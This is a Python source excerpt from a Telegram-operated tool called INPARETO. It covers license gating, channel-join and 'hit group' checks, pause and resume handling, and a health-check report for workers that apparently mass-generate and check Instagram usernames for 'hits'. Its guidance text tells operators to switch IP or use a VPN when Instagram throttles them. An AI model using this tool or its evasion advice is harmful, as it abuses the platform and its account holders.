    for ach_id, (name, desc, sym) in ACHIEVEMENTS.items():
        if ach_id in unlocked:
            lines.append(f"  {sym}  <b>{html.escape(name)}</b>  <code>unlocked</code>\n")
            lines.append(f"      <i>{html.escape(desc)}</i>\n")
        else:
            lines.append(f"  ○  <code>locked</code>  <i>{html.escape(desc)}</i>\n")
    lines.append(tg_row("Progress", f"{len(unlocked)}/{len(ACHIEVEMENTS)}"))
    return "".join(lines)


def set_paused(value, *, remote=True):
    global _user_manual_paused
    if remote:
        _user_manual_paused = value
    if not value:
        _clear_hunt_ip_change_pause()
    apply_worker_pause_state()
    if remote:
        if value:
            log_event("PAUSE", "Paused remotely")
        elif paused:
            log_event("RESUME", "Still paused (API offline or access gate)")
        else:
            log_event("RESUME", "Hunt resumed remotely")
    elif value:
        log_event("PAUSE", "Paused")
    elif not paused:
        log_event("RESUME", "Resumed")


def sync_operator_access():
    global ACCESS_BLOCKED, _access_trust_ok_at
    if is_locally_logged_out():
        ACCESS_BLOCKED = True
        return False
    if not TELEGRAM_ENABLED:
        ACCESS_BLOCKED = False
        return True
    user_id = resolve_operator_telegram_id()
    if user_id and operator_ban_active(user_id, force=False):
        ACCESS_BLOCKED = True
        return False
    ok = admin_sync_terminal_access()
    if ok:
        _access_trust_ok_at = time.time()
        ACCESS_BLOCKED = False
        return True
    if _operator_hunt_trusted() or _access_trust_grace_active():
        ACCESS_BLOCKED = False
        return True
    ACCESS_BLOCKED = True
    return False


def hunting_license_ok(user_id=None):
    """Active plan required before hunt workers run (Free trial or Premium)."""
    if is_locally_logged_out():
        return False
    if not TELEGRAM_ENABLED:
        return True
    user_id = str(user_id or resolve_operator_telegram_id() or "").strip()
    if not user_id:
        return False
    if admin_is_admin(user_id):
        return True
    if operator_ban_active(user_id, force=False):
        return False
    ok, _, _ = plan_can_hunt(user_id)
    return bool(ok)


def hunting_license_ok_cached(user_id=None):
    """Cached license gate for worker/panel hot paths — avoids registry lock every loop."""
    if is_locally_logged_out():
        return False
    if not TELEGRAM_ENABLED:
        return True
    user_id = str(user_id or resolve_operator_telegram_id() or "").strip()
    if not user_id:
        return False
    if admin_is_admin(user_id):
        return True
    if _dashboard_local_premium_snap(user_id):
        return True
    now = time.time()
    if (
        _hunt_license_cache.get("ok") is not None
        and now - float(_hunt_license_cache.get("at") or 0) < HUNT_LICENSE_CACHE_TTL
    ):
        return bool(_hunt_license_cache["ok"])
    ok = hunting_license_ok(user_id)
    _hunt_license_cache.update(ok=ok, at=now)
    return ok


def _worker_api_ok():
    if _hunt_active_session():
        return True
    return get_api_alive_cached() or _hunt_recently_ok()


def operator_access_ok(*, force=False, actor_id=None):
    if is_locally_logged_out():
        return False
    if not TELEGRAM_ENABLED:
        return True
    actor_id = str(actor_id or "").strip()
    if actor_id and admin_is_admin(actor_id):
        return True
    user_id = resolve_operator_telegram_id()
    if not user_id:
        return False
    if operator_ban_active(user_id, force=force):
        _operator_gate_cache.update(user_id=user_id, ok=False, at=time.time())
        return False
    if not force and operator_access_sticky_active():
        return True
    if not force and _access_trust_grace_active() and read_operator_session_verified(user_id):
        return True
    if JACK_PANEL_LIVE and not force and read_operator_session_verified(user_id):
        return True
    if not force and read_operator_session_verified(user_id) and _dashboard_local_premium_snap(user_id):
        return True
    if not hunting_license_ok(user_id):
        if not force and read_operator_session_verified(user_id) and _operator_hunt_trusted():
            return True
        return False
    if not force and read_operator_session_verified(user_id):
        if operator_terminal_ready_local(fast=True):
            mark_operator_access_verified()
            return True
    if not force and operator_access_sticky_active():
        return True
    now = time.time()
    if (
        not force
        and _operator_gate_cache["user_id"] == user_id
        and _operator_gate_cache["ok"] is not None
        and now - _operator_gate_cache["at"] < OPERATOR_GATE_TTL
    ):
        return bool(_operator_gate_cache["ok"])
    if not force:
        if (
            _admin_access_cache["user_id"] == user_id
            and _admin_access_cache["ok"]
            and now - _admin_access_cache["at"] < ADMIN_ACCESS_TTL
        ):
            hg_ok, _ = operator_hit_group_access_state(force=False)
            return hg_ok
        return False
    granted, _ = admin_user_access_granted(user_id)
    if not granted:
        _operator_gate_cache.update(user_id=user_id, ok=False, at=now)
        return False
    hg_ok, _ = operator_hit_group_access_state(force=force)
    if hg_ok:
        mark_operator_access_verified()
    _operator_gate_cache.update(user_id=user_id, ok=hg_ok, at=now)
    return hg_ok


def telegram_actor_id(update):
    if "message" in update:
        return str(update["message"].get("from", {}).get("id", ""))
    if "callback_query" in update:
        return str(update["callback_query"].get("from", {}).get("id", ""))
    return ""


def operator_bot_commands_allowed(actor_id=None):
    """Bot slash commands — allow when cached/full access OR valid license for actor."""
    actor_id = str(actor_id or "").strip()
    if operator_access_ok(force=False, actor_id=actor_id):
        return True
    if is_linked_operator(actor_id) and _operator_hunt_trusted():
        return True
    if not is_linked_operator(actor_id) and not admin_is_admin(actor_id):
        return False
    check_id = actor_id or resolve_operator_telegram_id()
    entitled, _, _ = operator_plan_entitled(check_id)
    return bool(entitled)


def reply_hit_group_required(actor_id=None):
    """None if hit group OK; else Telegram message with setup keyboard."""
    sync_local_hit_group_from_cloud()
    gid = read_local_hit_group_id()
    if gid:
        hg_ok, reason = operator_hit_group_access_state(force=False)
        if hg_ok:
            return None
        hg_ok, reason = operator_hit_group_access_state(force=True)
        if hg_ok:
            return None
        text = format_hit_group_gate_message(reason or "not_admin")
        kb = hit_group_gate_keyboard()
        return send_hit_group_gate_reply(text, reply_markup=kb, force=True)
    reconcile_operator_hit_group()
    gid = read_local_hit_group_id()
    if gid:
        hg_ok, reason = operator_hit_group_access_state(force=True)
        if hg_ok:
            return None
        text = format_hit_group_gate_message(reason or "not_admin")
        kb = hit_group_gate_keyboard()
        return send_hit_group_gate_reply(text, reply_markup=kb, force=True)
    hg_ok, reason = operator_hit_group_access_state(force=True)
    if hg_ok:
        return None
    text = format_hit_group_gate_message(reason or "no_hit_group")
    kb = hit_group_gate_keyboard()
    return send_hit_group_gate_reply(text, reply_markup=kb, force=True)


def send_access_gate_reply():
    user_id = resolve_operator_id(TELEGRAM_CHAT_ID)
    text, kb = admin_gate_reply_for_user(user_id)
    if not text:
        return True
    safe_kb = sanitize_inline_keyboard_urls(kb) if kb else None
    if _is_hit_group_gate_text(text):
        return send_hit_group_gate_reply(text, reply_markup=safe_kb)
    resp = bot_command_reply(text, reply_markup=safe_kb)
    if resp is None and safe_kb:
        verify_only = {
            "inline_keyboard": [
                [{"text": "✓ I joined — verify access", "callback_data": "VERIFY_JOIN"}]
            ]
        }
        extra = "\n\n<i>Join links are in the message above — invalid invite URLs were skipped.</i>"
        resp = bot_command_reply(text + extra, reply_markup=verify_only)
    if resp is None:
        resp = bot_command_reply(text)
    return resp


def format_pause_resume_confirm(resuming):
    uptime = format_duration((datetime.now(timezone.utc) - START_TIME).total_seconds())
    tp = get_throughput_metrics()
    with lock:
        hits_count = hit
        generated = gen
    if resuming:
        if is_locally_logged_out():
            title = "Still Paused"
            tag = "WARN"
            detail = "Logged out on this device — link your bot again to resume hunting."
        elif _api_auto_paused:
            title = "Still Paused"
            tag = "WARN"
            detail = (
                "API endpoint offline — hunt stays auto-paused.\n"
                f"<i>Start <code>python endpoint.py</code> on this PC, then Resume.</i>"
            )
        elif TELEGRAM_ENABLED and not hunting_license_ok():
            title = "Still Paused"
            tag = "WARN"
            _, plan_reason, plan_info = plan_can_hunt()
            if plan_reason == "daily_limit":
                detail = (
                    f"Free daily limit reached ({FREE_DAILY_GEN_LIMIT:,}/day).\n"
                    "<b>Switch to INPARETO Premium</b> to continue — "
                    f"{tg_code('/redeem INPA-XXXX-XXXX-XXXX-XXXX')}"
                )
            elif plan_reason == "trial_expired":
                detail = (
                    f"Your {FREE_TRIAL_DAYS}-day free trial ended.\n"
                    f"Redeem Premium with {tg_code('/redeem INPA-…')} or contact support."
                )
            else:
                detail = (
                    "Plan inactive — check "
                    f"{tg_code('/plan')} or redeem Premium with "
                    f"{tg_code('/redeem INPA-XXXX-XXXX-XXXX-XXXX')}."
                )
        elif TELEGRAM_ENABLED and not operator_access_ok(force=True):
            title = "Still Paused"
            tag = "WARN"
            detail = "Complete channel joins and hit group setup, then tap Resume again."
        elif not pause_event.is_set():
            title = "Still Paused"
            tag = "WARN"
            detail = "Workers are on standby — access gate or API is blocking the hunt."
        else:
            title = "Hunt Resumed"
            tag = "RESUME"
            detail = (
                f"Workers online · session uptime <code>{uptime}</code>\n"
                f"Hits this session <code>{hits_count:,}</code> · "
                f"generated <code>{generated:,}</code>\n"
                f"Throughput <code>{tp['hits_per_hr']:.1f}</code> hits/hr"
            )
    else:
        paused_for = ""
        if PAUSED_SINCE:
            secs = (datetime.now(timezone.utc) - PAUSED_SINCE).total_seconds()
            paused_for = f" · paused for <code>{format_duration(secs)}</code>"
        title = "Hunt Paused"
        tag = "PAUSE"
        detail = (
            f"Workers on standby{paused_for}\n"
            f"Snapshot · hits <code>{hits_count:,}</code> · "
            f"gen <code>{generated:,}</code> · uptime <code>{uptime}</code>\n"
            f"<i>Tap Resume or send /resume to continue.</i>"
        )
    return format_action_notice(title, detail, tag)


def format_status_quick():
    uptime = format_duration((datetime.now(timezone.utc) - START_TIME).total_seconds())
    tp = get_throughput_metrics()
    api_lbl, _ = api_power_label()
    cloud_lbl, _ = cloud_power_label()
    with lock:
        hits_count = hit
        generated = gen
        valid_count = valid
        error_count = errors
    access = "verified" if operator_access_ok() else "locked"
    uid = resolve_operator_telegram_id()
    _, _, plan_info = plan_can_hunt(uid) if uid else (False, "no_user", {})
    if not isinstance(plan_info, dict) or not plan_info:
        plan_info = plan_build_snapshot(uid) if uid else {}
    if plan_info.get("tier") == "admin":
        plan_lbl = "Admin · unlimited"
    elif plan_info.get("plan") == PLAN_PREMIUM:
        plan_lbl = f"Premium · until {license_format_expiry(plan_info.get('expires_at'))}"
    elif plan_info.get("trial_expired"):
        plan_lbl = "Free · trial expired"
    elif plan_info.get("plan") == PLAN_FREE:
        used = int(plan_info.get("day_count") or 0)
        limit = int(plan_info.get("limit") or FREE_DAILY_GEN_LIMIT)
        plan_lbl = f"Free · {used:,}/{limit:,} today"
    else:
        plan_lbl = "inactive"
    return (
        format_panel_header()
        + f"<b>{S['btn_dash']} Status</b>\n\n"
        + f"<b>State</b>  {tg_state_badge()}\n"
        + tg_row("Plan", plan_lbl)
        + tg_row("Uptime", uptime)
        + tg_row("Hits", f"{hits_count:,}")
        + tg_row("Generated", f"{generated:,}")
        + tg_row("Valid", f"{valid_count:,}")
        + tg_row("Errors", f"{error_count:,}")
        + tg_row("Hits/hr", f"{tp['hits_per_hr']:.1f}")
        + tg_row("Access", access)
        + tg_row("API", api_lbl.replace("● ", "").replace("◌ ", ""))
        + tg_row("Cloud", cloud_lbl.replace("● ", "").replace("◌ ", ""))
    )


def format_api_quick():
    api_ok = get_api_alive()
    base = get_api_base_url() or f"http://{ip}:{port}"
    via = _health_cache.get("api_via") or "—"
    state = f"{S['live']} ONLINE" if api_ok else f"{S['idle']} OFFLINE"
    return (
        format_panel_header()
        + f"<b>API Gateway</b>\n\n"
        + tg_row("Status", state)
        + tg_row("Base URL", base)
        + tg_row("Route", via)
        + tg_row("Probe", f"http://{ip}:{port}/alive")
        + "\n<i>Start endpoint.py on this machine if offline.</i>"
    )


def format_cloud_quick():
    cloud_ok = get_cloud_alive()
    state = f"{S['live']} SYNCED" if cloud_ok else f"{S['idle']} OFFLINE"
    sync_lbl, _ = cloud_sync_label()
    return (
        format_panel_header()
        + f"<b>Cloud Sync</b>\n\n"
        + tg_row("Supabase", state)
        + tg_row("Profile", sync_lbl.replace("● ", "").replace("◌ ", ""))
        + tg_row("Telegram ID", resolve_operator_telegram_id() or "—")
    )


_CHECK_ICON = {"ok": "✅", "fail": "❌", "warn": "⚠️", "skip": "➖"}
_CHECK_BUFFER_FILLING = 80 if _IS_TERMUX else 200
_CHECK_BUFFER_STRONG = 360 if _IS_TERMUX else 500


def _check_row(status, label, detail=""):
    icon = _CHECK_ICON.get(status, "·")
    line = f"  {icon} <b>{html.escape(label)}</b>"
    if detail:
        line += f" — {html.escape(str(detail))}"
    return line


def _check_add(checks, *, key, status, label, detail="", fix=""):
    checks.append({
        "key": key,
        "status": status,
        "label": label,
        "detail": detail,
        "fix": fix,
    })


def collect_operator_health_checks(actor_id=None, *, remote=False):
    """
    Full diagnostic snapshot for /check.
    remote=True: cloud/account checks only (admin inspecting another user ID).
    """
    actor_id = str(actor_id or resolve_operator_telegram_id() or "").strip()
    machine_uid = str(resolve_operator_telegram_id() or "").strip()
    checks = []
    runtime = {}

    if not actor_id:
        _check_add(
            checks, key="telegram", status="fail", label="Telegram account",
            detail="No operator ID", fix="Link the bot in joint.py first.",
        )
        return {"checks": checks, "runtime": runtime, "guidance": [], "actor_id": actor_id}

    if admin_is_admin(actor_id):
        _check_add(
            checks, key="plan", status="ok", label="Plan & license",
            detail="Admin · unlimited",
        )
    else:
        entitled, plan_reason, plan_info = operator_plan_entitled(actor_id)
        if entitled:
            if isinstance(plan_info, dict) and plan_info.get("plan") == PLAN_FREE:
                used = int(plan_info.get("day_count") or 0)
                limit = int(plan_info.get("limit") or FREE_DAILY_GEN_LIMIT)
                days_left = int(plan_info.get("days_left") or 0)
                if used >= limit:
                    _check_add(
                        checks, key="plan", status="fail", label="Plan & license",
                        detail=f"Free daily limit {used:,}/{limit:,}",
                        fix="Upgrade with /redeem INPA-… for Premium unlimited hunt.",
                    )
                else:
                    _check_add(
                        checks, key="plan", status="ok", label="Plan & license",
                        detail=f"Free · {days_left}d left · {used:,}/{limit:,} today",
                    )
            elif isinstance(plan_info, dict) and plan_info.get("plan") == PLAN_PREMIUM:
                _check_add(
                    checks, key="plan", status="ok", label="Plan & license",
                    detail=f"Premium · until {license_format_expiry(plan_info.get('expires_at'))}",
                )
            else:
                _check_add(checks, key="plan", status="ok", label="Plan & license", detail="Active")
        elif plan_reason == "expired":
            exp = plan_info.get("expires_at") if isinstance(plan_info, dict) else None
            _check_add(
                checks, key="plan", status="fail", label="Plan & license",
                detail=f"Premium expired · {license_format_expiry(exp)}",
                fix="Your Premium ended — redeem a fresh key: /redeem INPA-XXXX-XXXX-XXXX-XXXX",
            )
        elif plan_reason == "trial_expired":
            _check_add(
                checks, key="plan", status="fail", label="Plan & license",
                detail=f"Free trial ended ({FREE_TRIAL_DAYS} days)",
                fix="Trial is over — grab Premium with /redeem or ask admin for /grant.",
            )
        elif plan_reason == "cloud_offline":
            _check_add(
                checks, key="plan", status="warn", label="Plan & license",
                detail="Cloud offline — cannot verify plan",
                fix="Check internet on the hunt PC, wait 30s, then /check again or /plan.",
            )
        else:
            _check_add(
                checks, key="plan", status="fail", label="Plan & license",
                detail="No active trial or license",
                fix="Send /plan in bot — start free trial or /redeem a Premium key.",
            )

    if operator_ban_active(actor_id, force=True):
        _check_add(
            checks, key="ban", status="fail", label="Account status",
            detail="Suspended by admin",
            fix="Your account is paused — contact INPARETO admin to review access.",
        )
    else:
        _check_add(checks, key="ban", status="ok", label="Account status", detail="Not suspended")

    if not admin_is_admin(actor_id):
        granted, access_state = admin_user_access_granted(actor_id)
        if granted:
            _check_add(checks, key="channels", status="ok", label="Required channels", detail="All joins verified")
        elif access_state == "banned":
            _check_add(
                checks, key="channels", status="fail", label="Required channels",
                detail="Suspended",
                fix="Contact admin — hunting is disabled for this account.",
            )
        elif isinstance(access_state, list):
            missing = ", ".join(
                (r.get("preview_name") or "Channel")[:20] for r in access_state[:3]
            )
            _check_add(
                checks, key="channels", status="fail", label="Required channels",
                detail=f"Missing: {missing or 'joins pending'}",
                fix="Join every link in the bot, then tap Verify or send /verify in DM.",
            )
        else:
            _check_add(
                checks, key="channels", status="warn", label="Required channels",
                detail=str(access_state or "pending")[:60],
                fix="Open bot DM → complete channel joins → /verify.",
            )
    else:
        _check_add(checks, key="channels", status="ok", label="Required channels", detail="Admin bypass")

    reconcile_operator_hit_group()
    gid = get_operator_hit_group_id() if actor_id == machine_uid or not remote else (
        fetch_operator_hit_group_id_for_telegram_user(actor_id) or ""
    )
    if actor_id == machine_uid or not remote:
        hg_ok, hg_reason = operator_hit_group_access_state(force=True)
    else:
        hg_ok, hg_reason = (bool(gid), "no_hit_group" if not gid else None)
    if hg_ok:
        _check_add(
            checks, key="hitgroup", status="ok", label="Hit group",
            detail=f"Linked · bot can post · {gid or '—'}",
        )
    elif not gid:
        _check_add(
            checks, key="hitgroup", status="fail", label="Hit group",
            detail="Not linked",
            fix="Create a private Telegram group → add YOUR bot → promote to admin → "
            "send /verifyhitgroup inside that group (not DM).",
        )
    elif hg_reason == "not_admin":
        _check_add(
            checks, key="hitgroup", status="fail", label="Hit group",
            detail=f"Bot needs admin · {gid}",
            fix="Open your hit group → bot → Promote to admin (Post messages + Change info) "
            "→ /verifyhitgroup in the group.",
        )
    else:
        _check_add(
            checks, key="hitgroup", status="warn", label="Hit group",
            detail=f"Linked · {hg_reason or 'pending'} · {gid}",
            fix="Run /verifyhitgroup inside your hit group to refresh bot permissions.",
        )

    if remote:
        _check_add(
            checks, key="device", status="skip", label="This device",
            detail="Remote check — runtime stats need user's own /check on their PC/phone",
        )
        guidance = _build_operator_check_guidance(checks, runtime, remote=True)
        return {"checks": checks, "runtime": runtime, "guidance": guidance, "actor_id": actor_id}

    linked = is_linked_operator(actor_id) or (actor_id == machine_uid)
    if machine_uid and actor_id != machine_uid and not admin_is_admin(actor_id):
        _check_add(
            checks, key="account", status="warn", label="Bot account",
            detail=f"This device is linked to {machine_uid}, not you ({actor_id})",
            fix="Use the Telegram account linked on this hunt PC, or re-link joint.py with your ID.",
        )
    elif machine_uid:
        _check_add(
            checks, key="account", status="ok", label="Bot account",
            detail=f"Linked · {machine_uid}",
        )
    else:
        _check_add(
            checks, key="account", status="fail", label="Bot account",
            detail="Device not linked",
            fix="Restart joint.py and complete Telegram linking on this machine.",
        )

    if is_locally_logged_out():
        _check_add(
            checks, key="session", status="fail", label="Device session",
            detail="Logged out locally",
            fix="Run joint.py again and link your Telegram bot.",
        )
    elif _session_awaiting_verification:
        _check_add(
            checks, key="session", status="fail", label="Setup screen",
            detail="Waiting at terminal setup",
            fix="Finish plan + channels + hit group in Telegram, then press Enter in the "
            "joint.py terminal (not stuck on the menu).",
        )
    elif read_operator_session_verified(machine_uid or actor_id):
        _check_add(checks, key="session", status="ok", label="Device session", detail="Verified")
    else:
        _check_add(
            checks, key="session", status="warn", label="Device session",
            detail="Not fully verified yet",
            fix="Send /verify in bot DM after joins, then /verifyhitgroup in your hit group.",
        )

    cloud_ok = get_cloud_alive()
    _check_add(
        checks, key="cloud", status="ok" if cloud_ok else "warn", label="Cloud sync",
        detail="Reachable" if cloud_ok else "Offline / slow",
        fix="" if cloud_ok else "Check internet — license and hit-group sync need cloud.",
    )

    api_ok = get_api_alive()
    _check_add(
        checks, key="api", status="ok" if api_ok else "fail", label="API gateway (endpoint.py)",
        detail=get_api_base_url() or f"http://{ip}:{port}" if api_ok else "Offline",
        fix="" if api_ok else "Start endpoint.py (start-api.sh) on this machine, then /resume.",
    )

    _refresh_hunt_gateway_meta(force=True)
    buf = _hunt_gateway_meta.get("buffer")
    ig_block = float(_hunt_gateway_meta.get("ig_block") or 0.0)
    try:
        buf_n = int(buf) if buf is not None else None
    except (TypeError, ValueError):
        buf_n = None

    with lock:
        generated = int(gen)
        valid_count = int(valid)
        hits_count = int(hit)
    idle = max(0.0, time.monotonic() - _last_gen_at)
    runtime.update(
        generated=generated,
        valid=valid_count,
        hits=hits_count,
        gen_idle_sec=round(idle, 1),
        buffer=buf_n,
        ig_block_sec=round(ig_block, 1),
        workers_started=_workers_started,
        panel_live=JACK_PANEL_LIVE,
        paused=paused,
        manual_pause=_user_manual_paused,
        api_auto_pause=_api_auto_paused,
        access_blocked=ACCESS_BLOCKED,
        hunt_block=hunt_block_reason(),
        threads=THREAD_COUNT,
        min_followers=MIN_FOLLOWERS,
    )

    if not _workers_started:
        _check_add(
            checks, key="workers", status="fail", label="Hunt workers",
            detail="Not started",
            fix="Pass the setup screen in terminal (press Enter after /verify) — workers start after that.",
        )
    elif _user_manual_paused:
        _check_add(
            checks, key="workers", status="fail", label="Hunt workers",
            detail="Paused manually",
            fix="You paused hunt — send /resume in bot or tap Resume on the panel.",
        )
    elif _api_auto_paused:
        _check_add(
            checks, key="workers", status="fail", label="Hunt workers",
            detail="Auto-paused (API was offline)",
            fix="Bring endpoint.py back online, wait ~10s, hunt resumes automatically or /resume.",
        )
    elif not pause_event.is_set():
        block = hunt_block_reason() or "standby"
        _check_add(
            checks, key="workers", status="fail", label="Hunt workers",
            detail=f"Standby · {block}",
            fix=_check_worker_fix_for_block(block),
        )
    else:
        _check_add(
            checks, key="workers", status="ok", label="Hunt workers",
            detail=f"Running · {len(worker_threads) or THREAD_COUNT} threads",
        )

    if buf_n is None:
        _check_add(
            checks, key="buffer", status="warn", label="Username buffer",
            detail="Unknown (API probe failed)",
            fix="Fix endpoint.py first — buffer lives on the local API.",
        )
    elif buf_n <= 0:
        _check_add(
            checks, key="buffer", status="warn", label="Username buffer",
            detail="Empty · refilling",
            fix="Buffer is empty — wait 30–60s. If it stays 0, restart endpoint.py.",
        )
    elif buf_n >= _CHECK_BUFFER_STRONG:
        _check_add(
            checks, key="buffer", status="ok", label="Username buffer",
            detail=f"Healthy · {buf_n:,} ready (pipeline OK)",
        )
    elif buf_n >= _CHECK_BUFFER_FILLING:
        _check_add(
            checks, key="buffer", status="ok", label="Username buffer",
            detail=f"Filling · {buf_n:,} ready",
        )
    else:
        _check_add(
            checks, key="buffer", status="warn", label="Username buffer",
            detail=f"Low · {buf_n:,} (buffer target {_min_followers_display()})",
            fix="Buffer is low — API may be slow or IG throttled. Give it a minute or restart endpoint.",
        )

    if ig_block > 2.0:
        _check_add(
            checks, key="ig", status="warn", label="Instagram cooldown",
            detail=f"{ig_block:.0f}s remaining",
            fix="Instagram asked us to slow down — hunt resumes automatically when cooldown ends.",
        )
    else:
        _check_add(checks, key="ig", status="ok", label="Instagram cooldown", detail="Clear")

    if generated == 0 and idle > 90 and api_ok:
        _check_add(
            checks, key="gen", status="fail", label="Generation",
            detail=f"0 generated · idle {idle:.0f}s",
            fix="",
        )
    elif generated == 0:
        _check_add(
            checks, key="gen", status="warn", label="Generation",
            detail="0 so far — session just started or waking up",
        )
    else:
        _check_add(
            checks, key="gen", status="ok", label="Generation",
            detail=f"{generated:,} usernames · valid {valid_count:,} · hits {hits_count:,}",
        )

    guidance = _build_operator_check_guidance(checks, runtime, remote=False)
    return {"checks": checks, "runtime": runtime, "guidance": guidance, "actor_id": actor_id}


def _check_worker_fix_for_block(block):
    block = (block or "").lower()
    if "access gate" in block:
        return "Access gate is on — /verify in bot + /verifyhitgroup in your hit group."
    if "suspended" in block:
        return "Account suspended — contact admin."
    if "plan" in block or "limit" in block or "trial" in block:
        return "Plan issue — /plan and /redeem if needed."
    if "logged out" in block:
        return "Session logged out — restart joint.py."
    if "buffer empty" in block:
        return "Buffer empty — wait or restart endpoint.py."
    if "api" in block:
        return "Start endpoint.py on this device."
    return "Send /resume · open Live Panel (press 1 in terminal) · run /check again."


def _build_operator_check_guidance(checks, runtime, *, remote=False):
    """Friendly prioritized fixes — special case: 0 gen + full buffer ≠ IP issue."""
    guidance = []
    fails = [c for c in checks if c.get("status") == "fail"]
    warns = [c for c in checks if c.get("status") == "warn"]

    for item in fails:
        fix = (item.get("fix") or "").strip()
        if fix:
            guidance.append(fix)

    gen = int(runtime.get("generated") or 0)
    buf = runtime.get("buffer")
    api_ok = any(c.get("key") == "api" and c.get("status") == "ok" for c in checks)
    buffer_healthy = isinstance(buf, int) and buf >= _CHECK_BUFFER_FILLING
    has_fail = bool(fails)

    if remote:
        if not guidance:
            guidance.append(
                "Cloud-side looks fine — ask the user to run /check on their own hunt device "
                "for live generation and buffer stats."
            )
        return guidance[:8]

    workers_ok = any(c.get("key") == "workers" and c.get("status") == "ok" for c in checks)
    if buffer_healthy and api_ok and not workers_ok:
        guidance.insert(
            0,
            "Buffer is full — usernames are ready, so this is <b>not an IP problem</b>. "
            "Hunt was auto-paused by a probe blip. Send <code>/resume</code> or press "
            "<b>1</b> for Live Panel. Hit enrich never pauses hunt anymore.",
        )
    elif gen == 0 and not has_fail and buffer_healthy and api_ok:
        guidance.insert(
            0,
            "Hey — good news: your buffer is filling and the API is healthy, so this is "
            "<b>not an IP/network problem</b>. Usernames are ready — hunt workers are just "
            "not consuming them yet. Press <b>1</b> for Live Panel in the joint.py terminal, "
            "send <code>/resume</code>, and make sure you passed the setup screen (Enter after /verify).",
        )
    elif gen == 0 and not has_fail and api_ok and not buffer_healthy:
        guidance.insert(
            0,
            "Setup looks mostly fine but the username buffer is still low or empty. "
            "Wait 1–2 minutes for refill. If it stays empty, restart <code>endpoint.py</code>. "
            "If buffer fills but gen stays 0, try a fresh IP (mobile hotspot) — IG may be "
            "throttling this network.",
        )
    elif gen == 0 and not has_fail and api_ok and buffer_healthy and not workers_ok:
        guidance.insert(
            0,
            "Buffer is healthy — pipeline is fine, not an IP issue. Hunt is paused or on standby "
            "on this device. Open terminal → option <b>1</b> Live Panel, or <code>/resume</code> in bot.",
        )
    elif gen == 0 and not has_fail and api_ok and not buffer_healthy and (buf or 0) == 0:
        guidance.insert(
            0,
            "If buffer stays at 0 for several minutes with API online, try changing your IP "
            "(mobile data / VPN) and restart endpoint.py — Instagram may be blocking generation on this network.",
        )

    for item in warns:
        fix = (item.get("fix") or "").strip()
        if fix and fix not in guidance:
            guidance.append(fix)

    if not guidance:
        if gen > 0:
            guidance.append(
                "Everything looks healthy — hunt is running. If pace feels slow, check IG cooldown "
                f"or raise threads with <code>/set threads {THREAD_COUNT}</code>.",
            )
        else:
            guidance.append(
                "All checks passed — give hunt 30–60 seconds after opening Live Panel. "
                "Counters update on the dashboard.",
            )

    return guidance[:8]


def format_operator_check_message(actor_id=None, *, remote=False):
    snap = collect_operator_health_checks(actor_id, remote=remote)
    checks = snap.get("checks") or []
    runtime = snap.get("runtime") or {}
    guidance = snap.get("guidance") or []
    actor_id = snap.get("actor_id") or "—"

    lines = [
        format_panel_header(),
        "<b>🔍 INPARETO Health Check</b>\n",
        f"<i>Friendly diagnostic for</i> <code>{html.escape(str(actor_id))}</code>\n",
    ]
    if remote:
        lines.append("<i>Admin remote view — device/runtime stats need user&apos;s own /check.</i>\n")

    lines.append(tg_section("CHECKLIST"))
    for item in checks:
        lines.append(
            _check_row(item.get("status"), item.get("label"), item.get("detail"))
            + "\n",
        )

    if runtime and not remote:
        lines.append(tg_section("LIVE STATS"))
        gen = int(runtime.get("generated") or 0)
        buf = runtime.get("buffer")
        buf_lbl = f"{buf:,}" if isinstance(buf, int) else "—"
        lines.append(tg_row("Generated", f"{gen:,}"))
        lines.append(tg_row("Buffer", buf_lbl))
        lines.append(tg_row("Gen idle", f"{runtime.get('gen_idle_sec', 0)}s"))
        lines.append(tg_row("Min target", _min_followers_display()))
        lines.append(tg_row("Threads", str(runtime.get("threads", THREAD_COUNT))))
        if runtime.get("hunt_block"):
            lines.append(tg_row("Block reason", str(runtime.get("hunt_block"))[:48]))
        lines.append("")

    lines.append(tg_section("WHAT TO DO"))
    if guidance:
        for idx, tip in enumerate(guidance[:6], 1):
            if "<b>" in tip or "<code>" in tip:
                lines.append(f"  {S['bullet']} {tip}\n")
            else:
                lines.append(f"  {S['bullet']} {html.escape(tip)}\n")
    else:
        lines.append(f"  {S['bullet']} No action needed — you&apos;re good to go.\n")

    fail_n = sum(1 for c in checks if c.get("status") == "fail")
    warn_n = sum(1 for c in checks if c.get("status") == "warn")
    ok_n = sum(1 for c in checks if c.get("status") == "ok")
    lines.append(
        f"\n<i>Summary: {ok_n} OK · {warn_n} warn · {fail_n} fail"
        f" — run /check anytime.</i>",
    )
    return "".join(lines)


def operator_check_reply_keyboard(snap):
    """Context buttons after /check."""
    checks = snap.get("checks") or []
    fails = {c.get("key") for c in checks if c.get("status") == "fail"}
    rows = []
    if "channels" in fails:
        rows.append([{"text": "✓ Verify joins", "callback_data": "VERIFY_JOIN"}])
    if "hitgroup" in fails:
        rows.append([{"text": "Verify hit group", "callback_data": "VERIFY_HITGROUP"}])
    if "plan" in fails:
        rows.append([{"text": "Plan & redeem", "callback_data": "HELP"}])
    if not rows:
        return panel_keyboard("notice")
    rows.append([{"text": "◈ Dashboard", "callback_data": "STATS"}])
    return {"inline_keyboard": rows}


def access_sync_loop():
    global ACCESS_BLOCKED
    was_blocked = False
    while not _access_sync_stop.is_set():
        try:
            if is_locally_logged_out():
                ACCESS_BLOCKED = True
                pause_event.clear()
                was_blocked = True
                time.sleep(ACCESS_SYNC_INTERVAL_SEC)
                continue
            apply_worker_pause_state()
            if ACCESS_BLOCKED and not was_blocked:
                if hit_group_recently_delivered() or operator_access_sticky_active():
                    mark_hit_group_verified_by_delivery()
                    apply_worker_pause_state()
                if ACCESS_BLOCKED and not operator_access_sticky_active():
                    if not _session_awaiting_verification and not JACK_PANEL_LIVE:
                        print_terminal_access_notice()
                    if not (JACK_PANEL_LIVE and _operator_hunt_trusted()):
                        if not _hunt_active_session():
                            pause_event.clear()
            was_blocked = ACCESS_BLOCKED
        except Exception as exc:
            log_event("ACCESS SYNC", str(exc)[:100])
        time.sleep(ACCESS_SYNC_INTERVAL_SEC)


def _min_followers_display():
    if MIN_FOLLOWERS_FILTER_ENABLED:
        return str(MIN_FOLLOWERS)
    return f"{MIN_FOLLOWERS} (filter off)"


def set_min_followers(value):
    global MIN_FOLLOWERS
    MIN_FOLLOWERS = max(1, int(value))
    if MIN_FOLLOWERS_FILTER_ENABLED:
        log_event("CONFIG", f"Target min set to {MIN_FOLLOWERS}")
    else:
        log_event("CONFIG", f"Min target saved {MIN_FOLLOWERS} (filter inactive — API patch)")
